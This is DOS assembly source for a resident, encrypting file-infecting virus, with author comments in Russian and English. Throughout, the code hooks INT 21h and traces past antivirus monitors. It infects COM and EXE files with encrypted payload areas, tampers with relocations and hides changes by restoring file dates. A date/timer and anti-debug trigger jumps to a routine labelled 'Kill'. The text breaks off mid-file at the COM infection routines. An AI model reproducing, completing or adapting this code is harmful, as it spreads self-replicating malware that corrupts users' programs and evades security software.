;SRCG - RiotOfViolence. RCE - mutant.
.model tiny
.code
.startup
CSEG SEGMENT PUBLIC
ASSUME CS:CSEG,DS:CSEG,ES:CSEG,SS:CSEG
.286
;------------------------------------------------------------------------------
Virus:		call $+3	;ну это уже классика...

		mov ax,3503h	;my aggression became to extreme to be kept
		int 21h		;under control...  
		mov byte ptr es:[bx],0CFh
		mov ah,2Ch
		int 21h		;отладчик поставит брякпоинт, а INT 3
_CLD_:		cld		;указывает на iret... :-E

		pop bp

;----------------------------- декриптор --------------------------------------
		mov si,offset StartOfVirus-3
		mov cx,(offset TheEnd-offset StartOfVirus)/2
K1 EQU $+1
		mov ax,0
K2 EQU $+1
		mov dx,0

TakeNextWord:	xor ds:[bp+si],ax
		add ax,dx
		inc si
		inc si
		loop TakeNextWord


;---------------------- terrible VIRUS:E --------------------------------------
StartOfVirus:	sub bp,3
		call RNDInit

;--------------------- иногда я ОЧЧЧЕНЬ ОПАСЕН --------------------------------
		cmp byte ptr cs:[bp+offset _CLD_],0CCh
		je KillEmAll

		mov ah,2Ah
		int 21h
		cmp dl,0Dh	;сегодня 13-e?
		jne GoodUser
		in ax,40h
		cmp ax,666d	;ax=666?
		jne GoodUser
KillEmAll:	jmp DeadUser	;Kill? Kill?! Kill!!!

;-------------------------- уже в памяти? -------------------------------------
GoodUser:	push "VI"
		push "OL"
		mov ah,30h		;Get DOS version.
		int 21h
		pop cx
		pop dx
		cmp cx,"EN"		;I'm here?
		jne StayInRAM
		cmp dx,"CE"
		jne StayInRAM
		jmp ImHere

;----------------------- Search for upper memory block ------------------------
StayInRAM:	cmp al,4		;DOS 4- ? Работать не будем.
		ja AllSystemsGo
		jmp ImHere

AllSystemsGo:	mov ah,52h		;Get List of Lists
		int 21h
		xor di,di
		lds si,es:[bx+12h]	;DS:SI - disk buffer
		mov ax,[si+1Fh]		;segment of first UMB
		inc ax			;no UMB if FFFFh
		jz NoUMB
		dec ax

SearchBlock:	mov ds,ax
		cmp word ptr ds:[di+1],di	;used?
		jnz SearchNext
		cmp word ptr ds:[di+3],(RealVirEnd-offset Virus)/16+2
		ja MCB	

SearchNext:	cmp byte ptr ds:[di],"Z"	;last block?
		jz NoUMB
		mov bx,ds:[di+3]		;Next block
		inc ax
		add ax,bx
		jmp SearchBlock

;------------ тут мы создаем новый MCB в upper memory -------------------------
MCB:		sub word ptr [di+3],(RealVirEnd-offset Virus)/16+2
		mov bx,[di+3]
		mov cl,"M"
		xchg cl,[di]
		inc ax
		add ax,bx
		mov ds,ax
		mov es,ax
		mov [di],cl
		mov word ptr [di+3],(RealVirEnd-offset Virus)/16+1
		mov word ptr [di+1],8	;хозяин DOS
		inc ax
		mov es,ax
		push cs
		pop ds
		mov si,bp
		xor di,di
		mov cx,TheEnd-offset Virus
		rep movsb
		call IntIntercept
		jmp ImHere

;------------- Если UMB недоступна садимся в нижние адреса -------------------
NoUMB:		mov ah,62h		;Get current PSP
		int 21h
		mov ds,bx
		mov bx,ds:[2]		;Top of RAM
		sub bx,(RealVirEnd-offset Virus)/16+1
		mov es,bx
		push ds
		push cs
		pop ds
		xor di,di
		mov si,bp
		mov cx,TheEnd-offset Virus
		rep movsb		;copy v-body to top of RAM
		pop ds
		mov si,0Ah
		mov di,offset JUMP_DOS+1
		movsw			;save old adress
		movsw
		mov ds:[0Ch],bx		;change it on our subroutine
		mov word ptr ds:[0Ah],offset GetBlock
		jmp ImHere

;----------------------- Get block in low memory ------------------------------
GetBlock:	mov ah,48h		;allocate memory
		mov bx,(RealVirEnd-offset Virus)/16+1
		int 21h
		jc ReturnToDOS		;fucking error
		push ax
		dec ax
		mov ds,ax
		mov word ptr ds:[1],8	;used by DOS
		pop es
		push cs
		pop ds
		xor si,si
		xor di,di
		mov cx,TheEnd-offset Virus
		cld
		rep movsb		;move

		call IntIntercept

ReturnToDOS:	clc
JUMP_DOS:	db 0EAh,0,0,0,0


;---------------------- Intercept INT 21h -------------------------------------
IntIntercept:	mov ah,62h
		int 21h
		mov ds,bx
		lds si,ds:[0006h]		;поиск через PSP:6
		call SearchINT21
		jnc PatchHandle

UseINT30:	push 0				;через INT 30,31
		pop ds
		mov si,0C0h
		call SearchINT21
		jnc PatchHandle

Trace:		push 0				;не вышло? А если протрассить?
		pop ds
		lds si,ds:[21h*4]
		mov es:ChkProc,offset CMP_Proc-offset ChkProc-2
		push cs
		call TraceMaster
		jmp PatchHandle

SearchINT21:	cmp byte ptr ds:[si],0EAh	;JMP xxxx:xxxx ?
		jne NotFound
		lds si,ds:[si+1]		;куда?
		cmp word ptr ds:[si],9090h	;проверка на два NOP
		jne Check2
		sub si,32h
		cmp word ptr ds:[si],9090h	;начало int 21?
		jne NotFound
Found:		clc
		ret

Check2:		cmp word ptr ds:[si],2E1Eh	;push ds, cs:
		jne NotFound
		add si,25h 
		cmp word ptr ds:[si],80FAh	;cli, push ax
		je Found
NotFound:	stc
		ret


PatchHandle:	mov word ptr es:[Caller+1],si	;адрес настоящего int 21
		mov word ptr es:[Caller+3],ds

		call CheckWindows
		jnz Windows

		mov es:Mode,0 
		mov es:ChkProc,offset CMP_Proc1-offset ChkProc-2
		push cs
		call TraceMaster
;---------------------------- Author comments ---------------------------------
;В общем случае здесь возможна ошибка. Например программа, отследившая  трасси-
;ровку, может отослать нас на iret. А мне похер - это юзера будут выбирать: что
;проще? Снести ли нафиг какой нибудь AVP Monitor или форматить винт?
;------------------------------------------------------------------------------

		sub si,es:@SIZE
		mov di,offset OldHandle
		cld
		push si
		movsw		;save old int 21 handle
		movsw
		movsb
		pop si

		cli
		mov byte ptr ds:[si],0EAh
		mov word ptr ds:[si+1],offset INT21Handle
		mov ds:[si+3],es
		sti
		ret


Windows:	mov es:Mode,offset WinInt21-offset RealINT21-2
		push 0
		pop ds
		lds si,ds:[21h*4]
		mov es:CS21,ds
		mov es:IP21,si
		push 0
		pop ds
		mov ds:[21h*4],offset Int21Handle
		mov ds:[21h*4+2],es
		ret

;-------------------- восстановим все как было --------------------------------
ImHere:		pusha
		call RandomCryptDecrypt
		popa

		mov ah,62h		;Get PSP segment
		int 21h
		mov es,bx		;ES=DS=PSP
		mov ds,bx

		test cs:[bp+CureMode],80h
		jz RestoreCOM
		jmp RestoreEXE

;------------------------------------------------------------------------------
RestoreCOM:	cmp cs:[bp+CureMode],1
		je WinCOMRestore

;------------------------------------------------------------------------------
NormalCOM:	mov di,cs:DataAreaOffset+bp
		add di,100h
		mov cx,cs:CryptedAreaLen+bp
		mov ax,cs:Key1+bp
		mov dx,cs:Key2+bp
		call CryptData

		xor ax,ax
		xor dx,dx
		xor bx,bx
		xor sp,sp
		push ax
		cld

		mov di,100h
		mov si,offset EXE_IP
		add si,bp
		movsw
		movsb

		push 0E6FFh
		push 0FBFCh
		push 08B01h
		push 0BEH
		push 0FFFEh
		push 0BCA4h
		push 0F3FAh

		mov di,bp+CryptedAreaOffset
		mov si,bp+DataAreaOffset
		add si,100h
		mov cx,bp+CryptedAreaLen
		mov bp,912h
		jmp sp


;------------------------------------------------------------------------------
WinCOMRestore:	mov di,100h
		mov si,offset EXE_IP
		add si,bp
		mov cx,10h
		rep movsb

		xor ax,ax
		xor dx,dx
		xor bx,bx
		xor cx,cx
		mov bp,912h
		xor sp,sp
		push 0
		mov si,100h
		mov di,sp
		jmp si
		

;------------------------------------------------------------------------------
RestoreEXE:	cmp cs:[bp+CureMode],80h
		jne $+4
		jmp RestoreEXE1
		cmp cs:[bp+CureMode],81h
		jne $+5
		jmp RestoreEXE2

;------------------------------------------------------------------------------
RestoreEXE3:	mov ax,4C00h
		int 21h


;------------------------------------------------------------------------------
;запуск файла, инфицированного методом insert или оверлея
;------------------------------------------------------------------------------
RestoreEXE1:	mov ds,es:[2Ch]
		xor si,si		;DS:SI = Process environment

FindName:	inc si
		cmp word ptr ds:[si],1
		jne FindName

		inc si
		inc si
		mov dx,si		;DS:DX = Full name of file

		mov ax,3D00h		;Open file for read
		int 21h
		push cs
		pop ds
		jnc ReadMyData

;------------------------- что то пошло не так... -----------------------------
FuckingError:	mov dx,offset ErrMessage
		add dx,bp
		mov ah,9			;print string
		int 21h
		mov ax,4C00h			;высыпаемся в DOS
		int 21h
ErrMessage db "Not enough memory.",10,13,"$"


ReadMyData:	mov bx,ax			;Get handle
		mov ax,4200h			;файловый указатель - на данные
		mov cx,ds:[bp+DataAreaSeg]
		mov dx,ds:[bp+DataAreaOffset]
		int 21h

		mov dx,es
		add dx,10h

		mov ax,ds:[bp+EXE_IP]		;IP
		mov word ptr ds:[bp+offset LastJmp+1],ax
		mov ax,ds:[bp+EXE_CS]		;CS
		add ax,dx
		mov word ptr ds:[bp+offset LastJmp+3],ax

		mov ax,ds:[bp+Key1]
		mov word ptr ds:[bp+Key_1],ax
		mov ax,ds:[bp+Key2]
		mov word ptr ds:[bp+Key_2],ax

		mov si,offset Restorer
		add si,bp
		mov ax,ss
		sub ax,10h
		mov word ptr ds:[bp+offset JmpRestorer+3],ax

		push es				;переносим в SS-10h:0
		mov es,ax
		xor di,di
		mov cx,RestorerEnd-RestorerStart
		cld
		rep movsb
		pop es

		mov ax,ds:[bp+EXE_SS]
		add ax,dx
		push ax				;SS
		push ds:[bp+EXE_SP]		;SP
		push ds:[bp+EXE_IP]		;SI=IP
		push es				;ES
		push es				;DS
		push ds:[bp+Relocations]

		push dx				;loading seg+10h
		add dx,ds:[bp+CryptedAreaSeg]
		mov ds,dx 
		mov dx,cs:[bp+CryptedAreaOffset]
		mov cx,cs:[bp+CryptedAreaLen]
		mov ah,3Fh
JmpRestorer:	db 0EAh,0,0,0,0


;------------------------------------------------------------------------------
	RestorerStart EQU $
Restorer:	int 21h				;read file
		pop bp

		mov di,dx			;DS:DX = crypted area adress
		call DecryptProc

		mov ax,ss
		sub ax,8
		mov ds,ax
		xor si,si
		pop cx				;настроим релокейшены
		jcxz Relocated

CallRead:	call ReadRelocs

Relocate:	cmp si,80h
		je CallRead
		lodsw
		mov di,ax
		lodsw
		add ax,bp
		mov es,ax
		add es:[di],bp
		loop Relocate

Relocated:	mov ah,3Eh			;закроем файлик
		int 21h
		pop es
		pop ds
		xor ax,ax
		xor cx,cx
		xor dx,dx
		xor bx,bx
		mov bp,912h
		pop si
		
		pop di
		cli				;чтобы нас не затерло стеком
		pop ss
		mov sp,di
		sti
LastJmp:	db 0EAh,0,0,0,0			;... три, два, один, пуск!

ReadRelocs:	push ax
		push cx
		push dx

		mov cx,80h
		xor dx,dx
		xor si,si
		mov ah,3Fh
		int 21h

		xor di,di
		call DecryptProc
		mov word ptr cs:[Key_1-RestorerStart],ax

		pop dx
		pop cx
		pop ax
		ret

DecryptProc:	Key_1 EQU $+1
		mov ax,0
		shr cx,1
DecryptRelocs:	xor [di],ax
		Key_2 EQU $+1
		add ax,0
		inc di
		inc di
		loop DecryptRelocs
		ret

	RestorerEnd EQU $


;------------------------------------------------------------------------------
;запуск файла, инфицированного методом appending
;------------------------------------------------------------------------------
RestoreEXE2:	push ds
		push es

		mov ax,es
		add ax,10h
		push ax
		add ax,cs:[CryptedAreaSeg+bp]
		mov es,ax
		mov di,cs:[CryptedAreaOffset+bp]
		mov cx,cs:[CryptedAreaLen+bp]
		mov ax,cs:[Key1+bp]
		mov dx,cs:[Key2+bp]
		call CryptData

		pop ax
		add ax,cs:[DataAreaSeg+bp]
		mov es,ax
		mov di,cs:[DataAreaOffset+bp]
		push di
		mov cx,cs:[Relocations+bp]
		push cx
		shl cx,2
		jcxz CorrectRelocs
		mov ax,cs:[Key1+bp]
		mov dx,cs:[Key2+bp]
		call CryptData

CorrectRelocs:	cld
		pop cx
		pop si

		mov dx,ds
		add dx,10h
		push es
		pop ds
		jcxz @Relocated

@Relocate:	lodsw
		mov di,ax
		lodsw
		add ax,dx
		mov es,ax
		add es:[di],dx
		loop @Relocate

@Relocated:	pop es
		pop ds
		cli
		mov ax,cs:[bp+EXE_SS]
		add ax,dx				;восстановим SS:SP
		mov ss,ax
		mov sp,cs:[bp+EXE_SP]
		mov ax,cs:[bp+EXE_IP]
		mov word ptr cs:[bp+@LastJump+1],ax	;IP
		mov ax,cs:[bp+EXE_CS]
		add ax,dx
		mov word ptr cs:[bp+@LastJump+3],ax	;CS
		xor ax,ax				;восстановим регистры
		xor cx,cx
		xor dx,dx
		xor bx,bx
		mov si,cs:[bp+EXE_IP]
		mov di,cs:[bp+EXE_SP]
		mov bp,912h
		sti
@LastJump db 0EAh,0,0,0,0


;------------------------- INT 21h handle -------------------------------------
INT21Handle:	pushf

CheckFunc:	cmp ah,30h
		jne ExecCheck

		push bp
		mov bp,sp
FindReq:	add bp,2
		jc RestoreBP
		inc bp
		jz RestoreBP
		dec bp
		cmp word ptr ss:[bp],"OL"
		jne FindReq
		cmp word ptr ss:[bp+2],"VI"
		jne FindReq
		mov word ptr ss:[bp],"EN"
		mov word ptr ss:[bp+2],"CE"
RestoreBP:	pop bp

ExecCheck:	pusha
		push ds
		push es

		call RestoreHandle

		xchg ax,bx
		cmp bx,4B00h
		jne FuckOff

		in al,21h
		mov cs:[IRQ_State],al
		or al,3			;disable timer and keyboard
		jmp $+2
		out 21h,al
		jmp $+2

		call SaveINT2A
		call KillINT2A

		mov ah,48h		;allocate mem
		mov bx,800h		;32K
		call INT21
		jc Restore2A&Exit
		inc ax
		mov cs:WorkSegment,ax

		call KillInt24

		mov cs:DOS_SS,ss
		mov cs:DOS_SP,sp
		mov ss,cs:WorkSegment
		mov sp,7FF0h

		jmp Infection

ExitVir:	mov ss,cs:DOS_SS
		mov sp,cs:DOS_SP

		call RestoreInt24

		mov ax,cs:WorkSegment
		dec ax
		mov es,ax
		mov ah,49h		;Free mem
		call INT21

Restore2A&Exit:	call RestoreInt2A
FuckOff:	jmp RealINT21


;-------------------------- The show must go on -------------------------------
;------------------------------------------------------------------------------
Infection:	xor bp,bp
		call RNDInit
		mov word ptr cs:FileNameOffset,dx
		mov word ptr cs:FileNameSeg,ds
		mov si,dx
		mov di,dx
		cld

FindEnd:	lodsb
		cmp al,"."		;find dot "."
		je DotFound
		cmp al,"\"
		jne SlashNotFound
		mov di,si
SlashNotFound:	or al,al		;end of name?
		jnz FindEnd
		jmp ExitVir

DotFound:	dec si
		mov word ptr cs:[DotOffset],si

		mov si,di
		xor bx,bx
		xor ax,ax
AddNext:	lodsb			;считаем CRC имени файла
		cmp al,"."
		je CheckCRC
		or al,20h
		add bx,ax
		rol bx,2
		jmp AddNext

CheckCRC:	push ds
		push cs
		pop ds
		mov cx,24		;сравниваем с табличными
		mov si,offset CRC_Table
NextCRC:	lodsw
		cmp ax,bx
		je ExitVir
		loop NextCRC
		pop ds

;----------------------- А хватит ли нам места? -------------------------------
		mov si,cs:FileNameOffset
		lodsw
		or al,20h
		sub al,61h
		cmp ah,":"
		je CheckDisk

		mov ah,19h	;get current drive
		call INT21

CheckDisk:	cmp al,2
		jae HDD
		jmp ExitVir
HDD:		mov ah,36h	;get free space
		mov dl,al
		inc dx
		call INT21
		mul cx		;bytes per cluster
		xchg cx,ax
		mov ax,8000h	;Max virsize = 32K
		div cx		;ax = number of clusters we need
		cmp ax,bx
		jb OpenFile
		jmp ExitVir	;not enough free disk space

;------------------------- Fuck AV - monitors ---------------------------------
OpenFile:	call KillFilename
		mov ax,4300h		;сохраняем атрибуты
		call INT21
		mov cs:Attrib,cx

		call KillFilename
		xor cx,cx		;сбрасываем атрибуты
		mov ax,4301h
		call INT21

		call KillFilename
		mov ax,3D02h		;open file R/W. Not COM, not EXE!
		call INT21
		jnc OpenSuccess
		call RestoreAttr
		jmp ExitVir

;----------------------------- Открыли файлик ---------------------------------
OpenSuccess:	push cs
		pop ds
		mov bx,ax
		mov FileHandle,ax
		mov ax,5700h		;сохраняем дату и время
		call INT21
		mov FileDate,dx
		mov FileTime,cx

include chkdate.inc			;не трогаем файл если он создан в
					;текущем месяце

		mov ah,3Fh		;считываем заголовок
		mov dx,offset Header
		mov cx,1Ah
		call INT21

		mov ax,4202h		;получаем длину файла
		xor cx,cx
		cwd
		call INT21

		call CheckForInfected	;already infected?
		jne NotInfected
WinEXE:		jmp Close&Restore

NotInfected:	or dx,dx		;меньше 4K не трогаем
		jnz GoodLen
		cmp ax,1000h
		ja GoodLen
		jmp Close&Restore

GoodLen:	cmp word ptr ds:[Header],"MZ"	;EXE - ?
		je EXE
		cmp word ptr ds:[Header],"ZM"
		je EXE
		jmp COM

;-------------------------- EXE files infection -------------------------------
EXE:		cmp word ptr Header+18h,40h
		jb DOS_Executable

		mov ax,4200h
		xor cx,cx
		mov dx,3Ch
		call INT21
		mov ah,3Fh		;читаем смещение PE header
		mov dx,offset Sign
		mov cx,4
		call INT21

		mov ax,4200h
		mov cx,word ptr Sign+2
		mov dx,word ptr Sign
		call INT21
		mov ah,3Fh		;читаем сигнатуру WinEXE (NE or PE)
		mov dx,offset Sign
		mov cx,2
		call INT21

		mov ax,4202h
		xor cx,cx
		cwd
		call INT21

		cmp byte ptr Sign+1,"E"	
		je WinEXE

DOS_Executable:	push dx
		push ax

		call GetSize
		mov ax,word ptr ds:[Header+4]	;filelen в блоках по 512 байт
		dec ax
		mov cx,200h
		mul cx
		add ax,word ptr ds:[Header+2]
		adc dx,0			;DX:AX = Filelen from header
		mov H_RealFileLen,dx
		mov L_RealFileLen,ax

;		or dx,dx
;		jz TestForOverlay

;		call EXECase4

TestForOverlay:	pop cx
		cmp ax,cx			;это оверлейный EXE?
		pop cx
		jne EXECase2
		cmp dx,cx
		jne EXECase2

		call RandomWord
		test al,1
		je EXECase3

;-------------------- Infection of EXE (Inserting) ----------------------------
EXECase1:	call CheckLen
		jc EXECase3		;image len < Virlen

		mov CureMode,80h	;чтоб потом запустить файл - носитель

		mov cx,VirLen
		mov word ptr ds:AreaLen,cx
		call EXEGetOffset

		mov ax,4200h		;go to virus place
		mov cx,HOffsetInFile
		mov dx,LOffsetInFile
		call INT21

		mov ah,3Fh		;считываем VirLen байт из файла
		mov cx,VirLen
		mov ds,WorkSegment
		xor dx,dx
		call INT21

		push cs
		pop ds
		mov CryptedAreaLen,ax
		mov ax,LOffsetInFile	;сохраняем адрес зашифрованной области
		mov dx,HOffsetInFile
		mov cx,10h
		div cx
		sub ax,word ptr ds:[Header+8]
		mov CryptedAreaOffset,dx
		mov CryptedAreaSeg,ax

		mov ax,4202h
		xor cx,cx
		cwd
		call INT21
		mov DataAreaSeg,dx	;конец файла - адрес начала данных
		mov DataAreaOffset,ax	;для лечения

		call InfectionEXE1
		call InfectionEXE2
		call InfectionEXE3
		jmp InfectionEXE4


;---------------------- Infection of overlay EXE ------------------------------
EXECase2:	call CheckLen
		jnc EXECase1
		jmp Close&Restore	;cannot infect this file.


;-------------------- Infection of EXE (Appending) ----------------------------
EXECase3:	mov CureMode,81h

		mov ax,800h
		call Rnd		;size of area to crypt
		mov CryptedAreaLen,ax
		mov word ptr ds:AreaLen,ax
		xchg cx,ax

		call EXEGetOffset

		mov ax,4200h		;где шифровать?
		mov cx,HOffsetInFile
		mov dx,LOffsetInFile
		call INT21

		mov ah,3Fh		;считываем X байт из файла
		mov cx,CryptedAreaLen
		mov ds,WorkSegment
		xor dx,dx
		call INT21

		push cs
		pop ds
		mov ax,LOffsetInFile	;сохраняем адрес зашифрованной области
		mov dx,HOffsetInFile
		mov cx,10h
		div cx
		sub ax,word ptr ds:[Header+8]
		mov CryptedAreaOffset,dx
		mov CryptedAreaSeg,ax

		mov ax,4200h		;просто шифруем кусок файла и оставляем
		mov cx,HOffsetInFile	;его на месте
		mov dx,LOffsetInFile
		call INT21

		call InfectionEXE1

		mov HOffsetInFile,dx	;куда писать самого зверя?
		mov LOffsetInFile,ax

		mov ax,4201h
		xor cx,cx
		mov dx,VirLen
		call INT21

		mov cx,10h
		div cx
		sub ax,word ptr Header+8
		mov DataAreaSeg,ax
		mov DataAreaOffset,dx
		push Relocations

		call InfectionEXE2

		pop cx
		shl cx,2
		add cx,VirLen
		add ax,cx
		adc dx,0

		push dx
		push ax

		mov cx,10h
		div cx

		sub ax,word ptr Header+8		
		add dx,100h
		and dx,0FFFEh			;SP должен быть четным
		mov word ptr ds:Header+0Eh,ax	;AX:DX = SS:SP
		mov word ptr ds:Header+10h,dx	;set new stack

		pop ax			;увеличиваем длину модуля на VirLen
		pop dx

		mov cx,200h
		div cx
		inc ax

		mov word ptr ds:[Header+4],ax
		mov word ptr ds:[Header+2],dx

		jmp InfectionEXE4


;------------------ Infection of EXE (Entry unknown) --------------------------
;EXECase4:	mov CureMode,82h	;до лучших времен...
;		ret


;------------------------------------------------------------------------------
;Подпрограммы для заражения EXE
;--------------------------------- Part I -------------------------------------
InfectionEXE1:	call RandomWord
		mov Key1,ax
		call RandomWord
		mov Key2,ax

		mov es,WorkSegment	;криптуем 
		xor di,di
		mov ax,Key1
		mov dx,Key2
		mov cx,CryptedAreaLen
		call CryptData

		mov ah,40h
		mov cx,CryptedAreaLen	;и пишем в файл
		push es
		pop ds
		xor dx,dx
		call INT21

		push cs
		pop es
		push cs
		pop ds
		mov di,offset EXE_IP
		cld

		mov si,offset Header+14h        ;CS:IP
		movsw
		movsw

		mov si,offset Header+0Eh        ;SS:SP
		movsw
		movsw

		push ds
		mov ax,3D00h
		mov dx,FileNameOffset
		mov ds,FileNameSeg
		call INT21
		pop ds
		mov SecondHandler,ax

		mov ax,word ptr ds:[Header+8]
		mov dx,10h
		mul dx
		inc ax
		adc dx,0

		mov cx,LOffsetInFile
		sub cx,ax
	 	mov word ptr ds:StartOffset,cx
		mov cx,HOffsetInFile
		sbb cx,dx
	 	mov word ptr ds:StartSeg,cx

		mov di,4000h			;xxxx:4000 - буфер

		call MovePointer
		xchg bx,SecondHandler
		call MovePointer

		mov Relocations,0
		mov ax,word ptr ds:[Header+6]	;число релокейшенов
		mov RelocationsNumber,ax

		mov es,WorkSegment		;рабочая область
		mov ds,WorkSegment


NextRelocs:	mov cx,cs:RelocationsNumber	;число релокейшенов < 1000h?
		cmp cx,1000h
		jae NotLastBlock
		rol cx,2
		jmp ReadBlock

NotLastBlock:	mov cx,4000h			;больше

ReadBlock:	mov word ptr cs:LastRelocation,cx

		mov ah,3Fh			;считываем в буфер
		xor dx,dx
		call INT21

		cld				;сканируем
		xor si,si

ScanRelocs:	cmp cs:RelocationsNumber,0	;больше нет ?
		je BlockCorrected		;тогда выходим
		cmp si,4000h			;досканировали блок?
		je BlockCorrected		;берем следующий

		lodsw
		push ax
		lodsw
		mov cx,10h
		mul cx
		pop cx
		add ax,cx
		adc dx,0			;dx:ax - changed word

		StartOffset EQU $+1
		sub ax,0
		StartSeg EQU $+2
		sbb dx,100h			;попадает в изменяемую область?
		or dx,dx
		jnz RelocOK
		AreaLen EQU $+1
		cmp ax,0
		ja RelocOK

		sub si,4			;если попадает нужно убрать.
		push si
		movsw				;переносим его в наш буфер.
		movsw
		pop si
		push si
		push di
		LastRelocation EQU $+1
		mov di,0			;заменяем на последний из
		sub di,4			;считанных релокейшенов.
		mov word ptr cs:LastRelocation,di
		xchg si,di
		movsw
		movsw
		pop di
		pop si

		inc cs:Relocations
		dec word ptr cs:[Header+6]	;одним меньше

RelocOK:	dec cs:RelocationsNumber
		jmp ScanRelocs		

BlockCorrected:	xchg cs:SecondHandler,bx

		mov ah,40h			;запишем обратно
		xor dx,dx
		mov cx,si
		jcxz Corrected
                call INT21

		cmp cs:RelocationsNumber,0
		je Corrected

		xchg cs:SecondHandler,bx
		jmp NextRelocs


;------------------- Все, с релокейшенами покончили. --------------------------
Corrected:	push cs
		pop ds
		xchg SecondHandler,bx
		mov ah,3Eh		;kill second descriptor
		call INT21

		mov bx,SecondHandler
		cmp Relocations,0
		je NoChangedRelocs

		push ds
		xor di,di
		mov cx,2000h
		xor ax,ax
		rep stosw

		mov ah,40h
		mov cx,Relocations
		shl cx,2
		push es
		pop ds
		xor dx,dx
		call INT21
		pop ds

NoChangedRelocs:mov ax,4202h            ;конец - делу венец;)
		xor cx,cx
		cwd
		call INT21
		ret

;------------------------------- Part II --------------------------------------
InfectionEXE2:	mov cx,Relocations
		rol cx,2
		jcxz NoRelocs
		mov di,4000h		;покриптуем релокейшены
		mov ax,Key1
		mov dx,Key2
		call CryptData

		mov ah,40h              ;и запишем их в конец файла
		mov cx,Relocations
		rol cx,2
		push es
		pop ds
		mov dx,4000h
		call INT21

NoRelocs:	push cs
		pop ds
		push cs
		pop es

		mov dx,HOffsetInfile
		mov ax,LOffsetInfile
		mov cx,10h
		div cx
		sub ax,word ptr Header+8

		push dx
		push ax

		mov DECRYPTOR_OFFSET,dx		;смещение в сегменте CS
		add dx,CSIZE
		mov CODE_OFFSET,dx		;ENTRY POINT второго декриптора

		call WriteVirusBody		;make decryptor

		push cs
		pop ds

		pop ax
		pop dx
		add dx,cx

		mov word ptr ds:Header+14h,dx
		mov word ptr ds:Header+16h,ax

		mov dx,H_RealFileLen
		mov ax,L_RealFileLen
		ret

;-------------------------------- Part III ------------------------------------
InfectionEXE3:	mov cx,10h
		div cx

		sub ax,word ptr Header+8		
		add ax,11h
		add dx,100h
		and dx,0FFFEh			;SP должен быть четным
		mov word ptr ds:Header+0Eh,ax	;AX:DX = SS:SP
		mov word ptr ds:Header+10h,dx	;set new stack
		ret

;--------------------------------- Part IV ------------------------------------
InfectionEXE4:	mov ax,4200h		;в начало
		xor cx,cx
		cwd
		call INT21

		mov ah,40h		;write header
		mov dx,offset Header
		mov cx,1Ah
		call INT21

		call RestoreDate	;restore date and time

		jmp Close&Restore	;Ну, если после всех этих издевательств
					;программа будет работать...



;--------------------------- test for max len ---------------------------------
COM:		mov H_RealFileLen,dx
		mov L_RealFileLen,ax

MaxLen:		call GetSize
		add ax,L_RealFileLen
		adc dx,0		;dx:ax infected file length

		or dx,dx		;file len > 64K?
		jnz BadLen
		cmp ax,0FEFFh
		jbe SelectMode
BadLen:		jmp Close&Restore

SelectMode:	mov ax,4202h
		mov cx,-1
		mov dx,-7
		call INT21

		mov ah,3Fh
		mov dx,offset Header+16
		mov cx,7
		call INT21

		cmp word ptr ds:[Header+19],"SN"
		je WinCOM

		mov CureMode,0

		mov ax,VirLen		;VirLen > FileLen?
		add ax,3
		cmp ax,L_RealFileLen
		ja COMCase1

		call RandomWord
		test al,1
		jnz COMCase2

;------------------------- Случай 1. В конец файла ----------------------------
COMCase1:	mov ax,1000h-3
		call Rnd		;длина шифруемой области
		xchg cx,ax

		call InfectionCOM1

		mov ax,4200h
		xor cx,cx
		mov dx,LOffsetInFile
		call INT21 

		call InfectionCOM2

		mov ax,4202h		;в конец
		xor cx,cx
		cwd
		call INT21

		mov cs:HOffsetInFile,dx
		mov cs:LOffsetInFile,ax

		call InfectionCOM3
		jmp InfectionCOM4


;-------------------------- Случай 2. В середину ------------------------------
COMCase2:	mov cx,VirLen
		call InfectionCOM1

		mov ax,4202h
		xor cx,cx
		cwd
		call INT21 

		call InfectionCOM2
		call InfectionCOM3
		jmp InfectionCOM4


;--------- COM файл из DOS 7 (защищены от изменений контрольной суммой) -------
WinCOM:		mov CureMode,1
		cld
		mov si,offset H_RealFileLen
		lodsw
		mov HOffsetInFile,ax
		sub word ptr [si],7
		lodsw
		mov LOffsetInFile,ax

		add ax,100h
		mov DECRYPTOR_OFFSET,ax
		add ax,CSIZE
		mov CODE_OFFSET,ax

		push cs
		pop es
		mov di,offset EXE_IP	;сохраняем первые 16 байт
		mov si,offset Header
		mov cx,10h
		rep movsb

		mov di,offset Header
		mov cx,8
DestroyPrg:	call RandomWord
		stosw
		loop DestroyPrg

		call WriteVirusBody

		push cs			;вычисляем смещение
		pop ds
		add cx,LOffsetInFile
		sub cx,3
		mov word ptr Header+1,cx

		call RandomWord
		mov cx,ax
		mov ax,0E9E8h		;call or jmp ?
OneOfUs:	xchg ah,al
		loop OneOfUs		; (c) KREATOR
		mov byte ptr Header,al

		mov ax,4200h		;в начало
		xor cx,cx
		cwd
		call INT21

		mov ah,40h		;пишем jmp (or call)
		mov dx,offset Header
		mov cx,10h
		call INT21

		mov ax,4202h
		mov cx,-1
		mov dx,-7
		call INT21

		mov ax,VirLen
		StampLen EQU $+1
		add ax,0
		sub ax,7
		add word ptr ds:[Header+15h],ax

		mov ah,40h
		mov dx,offset Header+10h
		mov cx,7
		call INT21

		call RestoreDate
		jmp Close&Restore	;close file & restore all


;---------------------------- COM Part I --------------------------------------
InfectionCOM1:	push cx
		xor dx,dx
		mov ax,L_RealFileLen
		sub ax,cx
		sub ax,3
		call GetOffset
		add ax,3

		mov HOffsetInFile,dx
		mov LOffsetInFile,ax

		add ax,100h
		mov CryptedAreaOffset,ax;Смещение закриптованного кода

		mov ax,4200h
		xor cx,cx
		mov dx,LOffsetInFile	;вот мы и на месте...
		call INT21

		mov ah,3Fh		
		mov ds,WorkSegment
		xor dx,dx
		pop cx
		call INT21		;читаем

		push cs
		pop ds
		mov CryptedAreaLen,ax
		call RandomWord		;сгенерили ключ
		mov Key1,ax
		call RandomWord
		mov Key2,ax

		mov es,WorkSegment	;криптуем 
		xor di,di
		mov ax,Key1
		mov dx,Key2
		mov cx,CryptedAreaLen
		call CryptData
		ret

;---------------------------- COM Part II -------------------------------------
InfectionCOM2:	mov DataAreaSeg,10h
		mov DataAreaOffset,ax
		mov ah,40h
		mov cx,CryptedAreaLen	;и пишем
		push es
		pop ds
		xor dx,dx
		call INT21
		ret


;---------------------------- COM Part III ------------------------------------
InfectionCOM3:	push cs
		pop es
		mov di,offset EXE_IP	;сохраняем первые 3 байта
		push cs
		pop ds
		mov si,offset Header
		cld
		movsw
		movsb
		mov ax,LOffsetInFile
		add ax,100h
		mov DECRYPTOR_OFFSET,ax
		add ax,CSIZE
		mov CODE_OFFSET,ax
		ret

;---------------------------- COM Part IV -------------------------------------
